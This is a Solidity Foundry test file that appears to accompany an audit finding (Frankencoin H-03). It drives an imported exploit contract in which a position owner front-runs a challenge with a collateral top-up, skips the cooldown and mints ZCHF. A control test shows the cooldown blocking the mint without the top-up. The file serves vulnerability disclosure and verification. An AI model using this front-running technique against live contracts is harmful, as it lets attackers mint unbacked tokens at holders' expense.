// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./20018-h-03-when-the-challenge-is-successful-the-user-can-send-toke.sol";

/*//////////////////////////////////////////////////////////////////////////
    Frankencoin [H-03] — cooldown not extended after successful challenge
    when owner front-runs with a collateral top-up.

    Driver re-asserts the harm: after end(), cooldown stays open and the
    owner mints PRICE ZCHF against the remaining minimum collateral. A
    control shows that WITHOUT the top-up, cooldown is extended to
    expiration and mint reverts.
//////////////////////////////////////////////////////////////////////////*/
contract CooldownBypassTest is Test {
    function test_frontRun_topUp_skips_cooldown_and_mints() public {
        Exploit exp = new Exploit();
        exp.run();

        assertEq(exp.mintedAfterChallenge(), exp.MINT_AMOUNT(), "minted inflated amount");
        assertTrue(exp.cooldownAfterChallenge() != exp.position().expiration(), "cooldown not extended");
        assertEq(exp.zchf().balanceOf(address(exp)), exp.MINT_AMOUNT(), "owner holds minted ZCHF");
    }

    /// @notice Control: without a front-run top-up, withdraw drops balance below
    ///         minimum, cooldown becomes expiration, and mint reverts.
    function test_noTopUp_extends_cooldown_blocks_mint() public {
        CollateralToken col = new CollateralToken();
        ZCHF zchf = new ZCHF();
        MintingHub hub = new MintingHub();
        Position position = new Position(address(this), address(hub), address(col), address(zchf), 1e18, 1000e18);
        col.mint(address(position), 1e18);

        uint256 id = hub.launchChallenge(position, 1e18);
        // No top-up: end() withdraws all collateral, balance = 0 < minimum.
        hub.end(id);

        assertEq(position.collateralBalance(), 0, "fully withdrawn");
        assertEq(position.cooldown(), position.expiration(), "cooldown extended to expiration");

        // Even if we re-fund the position, mint is blocked by cooldown.
        col.mint(address(position), 1e18);
        vm.expectRevert(bytes("cooldown"));
        position.mint(1000e18);
    }
}
